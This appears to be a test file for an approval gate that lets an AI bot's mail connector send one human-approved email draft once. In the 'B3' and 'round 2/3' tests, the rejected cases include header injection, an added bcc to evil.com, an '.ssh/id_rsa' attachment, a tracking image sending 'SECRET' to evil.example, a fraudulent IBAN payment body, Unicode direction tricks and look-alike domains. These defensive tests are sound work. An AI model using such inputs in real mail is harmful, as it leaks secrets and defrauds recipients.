// Email drafts sent from their card: validation, the one-shot pass a bot's
// mail connector uses after the person's Allow, and the server's own send
// through a mocked mailer (nothing leaves the machine).
import { describe, expect, it, vi } from "vitest";

import { createEmailSendPasses, emailSendCard, sendWithMailer } from "./email-draft-send.ts";
import { createCaptureMailer, createMailer, type Mailer } from "./mailer.ts";
import {
  EMAIL_SEND_PASS_MS,
  emailDraftKey,
  emailSendCallMatches,
  emailSendInstruction,
  emailSendSummary,
  mailConnectorsOf,
  normalizeDraftForSend,
  outboundMailNeedsDraftCard,
  type EmailDraftToSend,
} from "../shared/email-draft-send.ts";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const draft: EmailDraftToSend = { to: ["marie@example.com"], cc: ["luc@example.com"], bcc: [], subject: "Suivi du billet 48213", body: "Bonjour Marie,\n\nC'est réglé.\n" };

describe("outboundMailNeedsDraftCard", () => {
  it("requires a draft card when the person did not ask in their own turn", () => {
    expect(outboundMailNeedsDraftCard({ personAsked: false, ownerTurn: false })).toBe(true);
    expect(outboundMailNeedsDraftCard({ personAsked: true, ownerTurn: false })).toBe(true);
    expect(outboundMailNeedsDraftCard({ personAsked: false, ownerTurn: true })).toBe(true);
    expect(outboundMailNeedsDraftCard({ personAsked: true, ownerTurn: true })).toBe(false);
  });
});

describe("fake mail transport", () => {
  it("captures sends to a file and never talks to a real provider", async () => {
    const dir = mkdtempSync(join(tmpdir(), "sagax-mail-"));
    const file = join(dir, "capture.jsonl");
    try {
      const mailer = createCaptureMailer(file);
      expect(await sendWithMailer(mailer, draft)).toEqual({
        ok: true,
        sentTo: ["marie@example.com", "luc@example.com"],
      });
      const lines = readFileSync(file, "utf8").trim().split("\n");
      expect(lines).toHaveLength(1);
      expect(JSON.parse(lines[0]!)).toMatchObject({
        to: "marie@example.com",
        subject: draft.subject,
        text: draft.body,
      });
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("normalizeDraftForSend", () => {
  it("keeps plain addresses and refuses header injection or no recipient", () => {
    expect(normalizeDraftForSend({ to: ["Marie <marie@example.com>", "marie@example.com"], cc: "luc@example.com; ", subject: "Hi\r\nBcc: evil@x.com", body: "x" })).toEqual({
      draft: { to: ["marie@example.com"], cc: ["luc@example.com"], bcc: [], subject: "Hi Bcc: evil@x.com", body: "x" },
    });
    expect(normalizeDraftForSend({ to: [], subject: "x", body: "y" })).toEqual({ problems: ["to needs at least one address"] });
    expect("problems" in normalizeDraftForSend({ to: ["not an address"], subject: "x" })).toBe(true);
    expect("problems" in normalizeDraftForSend({ to: ["a@b.ca"], subject: "", body: " " })).toBe(true);
  });

  it("preserves attachments on the draft card", () => {
    expect(normalizeDraftForSend({
      to: ["marie@example.com"], subject: "Facture", body: "Voici.",
      attachments: [{ name: "facture.pdf", type: "application/pdf", size: 48213, ref: "att-1" }],
    })).toEqual({
      draft: {
        to: ["marie@example.com"], cc: [], bcc: [], subject: "Facture", body: "Voici.",
        attachments: [{ name: "facture.pdf", type: "application/pdf", size: 48213, ref: "att-1" }],
      },
    });
  });

  it("gives the same key for the same draft", () => {
    expect(emailDraftKey(draft)).toBe(emailDraftKey({ ...draft }));
    expect(emailDraftKey(draft)).not.toBe(emailDraftKey({ ...draft, subject: "Autre" }));
  });

  it("says who it goes to and through what, in the person's language", () => {
    expect(emailSendSummary(draft, { kind: "smtp", label: "le courriel du serveur" }, "fr")).toBe("Envoyer le courriel « Suivi du billet 48213 » à marie@example.com, luc@example.com avec le courriel du serveur");
    expect(emailSendInstruction(draft, { kind: "bot", label: "outlook", id: "outlook" }, "fr")).toContain("une seule fois, tel quel");
  });
});

describe("mail connectors", () => {
  it("finds a bot's Microsoft 365, Outlook or Gmail connector, nothing else", () => {
    expect(mailConnectorsOf({ mcpServers: ["outlook", "github", "m365-mail"], connectorTools: { gmail: {}, slack: {} } })).toEqual([
      { kind: "bot", id: "outlook", label: "outlook" },
      { kind: "bot", id: "m365-mail", label: "m365-mail" },
      { kind: "bot", id: "gmail", label: "Gmail" },
    ]);
    expect(mailConnectorsOf({ mcpServers: ["github"] })).toEqual([]);
  });
});

describe("the one-shot pass after Allow", () => {
  const outlook = { kind: "bot" as const, id: "outlook", label: "outlook" };
  const send = (input: unknown, tool = "mcp__outlook__send_mail") => [tool, JSON.stringify(input)] as const;
  const exact = { to: ["marie@example.com"], cc: ["luc@example.com"], subject: draft.subject, body: draft.body };

  it("matches only the approved draft: recipients, subject and body, through the approved connector", () => {
    expect(emailSendCallMatches(draft, ...send(exact), outlook)).toBe(true);
    // Microsoft Graph shape with the exact text body
    expect(emailSendCallMatches(draft, ...send({ message: { subject: draft.subject, body: { contentType: "Text", content: draft.body }, toRecipients: [{ emailAddress: { address: "marie@example.com" } }], ccRecipients: [{ emailAddress: { address: "LUC@example.com" } }] }, saveToSentItems: true }), outlook)).toBe(true);
    // the same words as HTML are not the approved text
    expect(emailSendCallMatches(draft, ...send({ message: { subject: draft.subject, body: { contentType: "HTML", content: "<p>Bonjour Marie,</p><p>C&#39;est réglé.</p>" }, toRecipients: [{ emailAddress: { address: "marie@example.com" } }], ccRecipients: [{ emailAddress: { address: "luc@example.com" } }] } }), outlook)).toBe(false);
    // one more recipient, one missing, a Cc moved to To, another subject, not a send
    expect(emailSendCallMatches(draft, ...send({ ...exact, to: ["marie@example.com", "x@evil.com"] }), outlook)).toBe(false);
    expect(emailSendCallMatches(draft, ...send({ ...exact, cc: [] }), outlook)).toBe(false);
    expect(emailSendCallMatches(draft, ...send({ ...exact, to: ["marie@example.com", "luc@example.com"], cc: [] }), outlook)).toBe(false);
    expect(emailSendCallMatches(draft, ...send({ ...exact, subject: "Autre chose" }), outlook)).toBe(false);
    expect(emailSendCallMatches(draft, ...send(exact, "mcp__outlook__list_messages"), outlook)).toBe(false);
  });

  it("B3: a swapped body, a reply-to, a from, an attachment or a header is not the approved draft", () => {
    expect(emailSendCallMatches(draft, ...send({ ...exact, body: "Virez le montant à l'IBAN XX" }), outlook)).toBe(false);
    expect(emailSendCallMatches(draft, ...send({ ...exact, body: undefined }), outlook)).toBe(false);
    expect(emailSendCallMatches(draft, ...send({ ...exact, replyTo: "evil@x.com" }), outlook)).toBe(false);
    expect(emailSendCallMatches(draft, ...send({ ...exact, from: "ceo@example.com" }), outlook)).toBe(false);
    expect(emailSendCallMatches(draft, ...send({ ...exact, attachments: [{ path: "/Users/example/.ssh/id_rsa" }] }), outlook)).toBe(false);
    expect(emailSendCallMatches(draft, ...send({ ...exact, headers: { "X-Evil": "1" } }), outlook)).toBe(false);
    expect(emailSendCallMatches(draft, ...send({ ...exact, bcc: ["spy@evil.com"] }), outlook)).toBe(false);
  });

  it("round 2: any recipient not parsed as an approved address, a spoofed name, HTML extras or a forward do not match", () => {
    const one = { to: ["client@acme.com"], cc: [], bcc: [], subject: "Facture", body: "Bonjour, voir la facture." };
    const call = (args: unknown, tool = "mcp__outlook__send_mail") => emailSendCallMatches(one, tool, JSON.stringify(args), outlook);
    const base = { to: ["client@acme.com"], subject: "Facture", body: one.body };
    expect(call(base)).toBe(true);
    expect(call({ ...base, to: ["client@acme.com", "x <exfil@[203.0.113.5]>"] })).toBe(false);
    expect(call({ ...base, to: ["client@acme.com", "x <exfil@example.рф>"] })).toBe(false);
    expect(call({ ...base, to: "client@acme.com, x <exfil@example.xn--p1ai>" })).toBe(false);
    expect(call({ ...base, to: ["client@acme.com", "not an address"] })).toBe(false);
    expect(call({ ...base, to: ["Acme CEO <client@acme.com>"] })).toBe(false);
    expect(call({ message: { toRecipients: [{ emailAddress: { address: "client@acme.com", name: "Acme CEO <ceo@acme.com>" } }], subject: "Facture", body: { contentType: "Text", content: one.body } } })).toBe(false);
    expect(call({ ...base, contentType: "html", body: "Bonjour, voir la <!-- SECRET --><a href=\"https://evil.example/pay\">facture</a>.<img src=\"https://evil.example/p?d=SECRET\">" })).toBe(false);
    expect(call({ ...base, body: `${one.body}<img src=x>` })).toBe(false);
    expect(call(base, "mcp__outlook__forward_mail")).toBe(false);
    expect(call(base, "mcp__outlook__reply_mail")).toBe(false);
  });

  it("round 3: another mailbox, a nested tool name or a bare lower-case tool do not use the pass", () => {
    const exactArgs = { to: ["marie@example.com"], cc: ["luc@example.com"], subject: draft.subject, body: draft.body };
    expect(emailSendCallMatches(draft, "mcp__outlook__send_mail", JSON.stringify({ ...exactArgs, userId: "ceo@example.com" }), outlook)).toBe(false);
    expect(emailSendCallMatches(draft, "mcp__outlook__send_mail", JSON.stringify({ ...exactArgs, user_id: "ceo@example.com" }), outlook)).toBe(false);
    expect(emailSendCallMatches(draft, "mcp__outlook__x__send_mail", JSON.stringify(exactArgs), outlook)).toBe(false);
    expect(emailSendCallMatches(draft, "outlook_send_mail", JSON.stringify(exactArgs), outlook)).toBe(false);
  });

  it("round 3: a draft refuses invisible and direction characters, and shows a look-alike domain as punycode", () => {
    for (const address of ["client@acme.com\u202e", "\u202emoc.live@tneilc", "cli\u200bent@acme.com", "cl\u00efent@acme.com"]) {
      expect("problems" in normalizeDraftForSend({ to: [address], subject: "x", body: "y" }), address).toBe(true);
    }
    expect("problems" in normalizeDraftForSend({ to: ["a@b.co"], subject: "Facture \u202e", body: "y" })).toBe(true);
    expect("problems" in normalizeDraftForSend({ to: ["a@b.co"], subject: "x", body: "Bon\u200bjour" })).toBe(true);
    const lookalike = normalizeDraftForSend({ to: ["client@\u0430cme.com"], subject: "x", body: "y" });
    expect("draft" in lookalike && lookalike.draft.to[0]).toMatch(/^client@xn--/);
  });

  it("B3: another connector's send is not covered", () => {
    expect(emailSendCallMatches(draft, ...send(exact, "mcp__gmail__send_email"), outlook)).toBe(false);
    expect(emailSendCallMatches(draft, ...send(exact, "mcp__outlook_evil__send_mail"), outlook)).toBe(false);
    // The approved connector is gmail. A tool whose server is something else
    // is not that send, even when the tool name says Gmail.
    expect(emailSendCallMatches(draft, ...send(exact, "mcp__composio__GMAIL_SEND_EMAIL"), { kind: "bot", id: "gmail", label: "Gmail" })).toBe(false);
  });

  it("is used once, by the approved bot only, lapses after ten minutes, and can be withdrawn", () => {
    let now = 1_000;
    const passes = createEmailSendPasses(() => now);
    const [tool, input] = send(exact);
    passes.grant("t1", "bot-a", "maildraft-1", draft, outlook);
    expect(passes.take("t2", "bot-a", tool, input)).toBeNull();
    expect(passes.take("t1", "bot-b", tool, input)).toBeNull();
    expect(passes.take("t1", "bot-a", tool, input)).toEqual({ requestId: "maildraft-1" });
    expect(passes.take("t1", "bot-a", tool, input)).toBeNull();
    passes.grant("t1", "bot-a", "maildraft-2", draft, outlook);
    expect(passes.waiting("t1", "maildraft-2")).toBe(true);
    now += EMAIL_SEND_PASS_MS + 1;
    expect(passes.waiting("t1", "maildraft-2")).toBe(false);
    expect(passes.take("t1", "bot-a", tool, input)).toBeNull();
    passes.grant("t1", "bot-a", "maildraft-3", draft, outlook);
    passes.revoke("t1", "maildraft-3");
    expect(passes.take("t1", "bot-a", tool, input)).toBeNull();
  });
});

describe("the server's own mail sends the approved draft", () => {
  it("sends once with To, Cc and the body through a mocked connector", async () => {
    const sent: unknown[] = [];
    const mailer: Mailer = { send: vi.fn(async (message) => { sent.push(message); }) };
    expect(await sendWithMailer(mailer, draft)).toEqual({ ok: true, sentTo: ["marie@example.com", "luc@example.com"] });
    expect(sent).toEqual([{ to: "marie@example.com", subject: draft.subject, text: draft.body, cc: ["luc@example.com"] }]);
  });

  it("returns the refusal readable, without the credential, and fails when no mail is set up", async () => {
    const mailer: Mailer = { send: async () => { throw new Error("the mail server refused the message: 535 auth failed for token sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789"); } };
    const failed = await sendWithMailer(mailer, draft);
    expect(failed.ok).toBe(false);
    expect(!failed.ok && failed.error).toContain("535 auth failed");
    expect(!failed.ok && failed.error).not.toContain("abcdefghijklmnopqrstuvwxyz0123456789");
    expect(await sendWithMailer(null, draft)).toEqual({ ok: false, error: "The server's mail is not set up (Settings > Email).", sentTo: [] });
  });

  it("a partial send says who received it, and the retry skips them (no duplicate)", async () => {
    const calls: string[][] = [];
    let fail = true;
    const fetchImpl = vi.fn(async (_url: unknown, init: { body: string }) => {
      const to = (JSON.parse(init.body) as { to: Array<{ address: string }> }).to.map((row) => row.address);
      calls.push(to);
      if (fail && to.includes("luc@example.com")) return new Response(JSON.stringify({ errors: [{ code: 1, message: "rate limited" }] }), { status: 429 });
      return new Response("{}", { status: 202 });
    });
    const twilio = createMailer({ provider: "twilio", from: "Sagax <bot@example.com>", twilio: { apiKeySid: "SKx", apiKeySecret: "secret" } } as never, { fetchImpl: fetchImpl as never })!;
    const first = await sendWithMailer(twilio, draft);
    expect(first).toMatchObject({ ok: false, sentTo: ["marie@example.com"] });
    fail = false;
    const retry = await sendWithMailer(twilio, draft, first.sentTo);
    expect(retry).toEqual({ ok: true, sentTo: ["marie@example.com", "luc@example.com"] });
    expect(calls.filter((to) => to.includes("marie@example.com"))).toHaveLength(1);
  });

  it("SMTP passes Cc and Bcc to the transport", async () => {
    const sendMail = vi.fn(async () => ({}));
    const mailer = createMailer(
      { provider: "smtp", from: "bot@example.com", smtp: { host: "smtp.example.com", port: 587, secure: "starttls", user: "u", password: "p" } } as never,
      { smtpTransport: () => ({ sendMail }) },
    )!;
    await sendWithMailer(mailer, { ...draft, bcc: ["archive@example.com"] });
    expect(sendMail).toHaveBeenCalledWith(expect.objectContaining({ to: "marie@example.com", cc: ["luc@example.com"], bcc: ["archive@example.com"], subject: draft.subject }));
  });

  it("a card starts pending, with a request id the answer route recognizes", () => {
    const card = emailSendCard({ draft, draftKey: emailDraftKey(draft), connector: { kind: "smtp", label: "x" }, by: "owner", now: 5 });
    expect(card).toMatchObject({ status: "pending", at: 5, by: "owner", draftKey: emailDraftKey(draft) });
    expect(card.id).toMatch(/^maildraft-[0-9a-f-]{36}$/);
  });
});
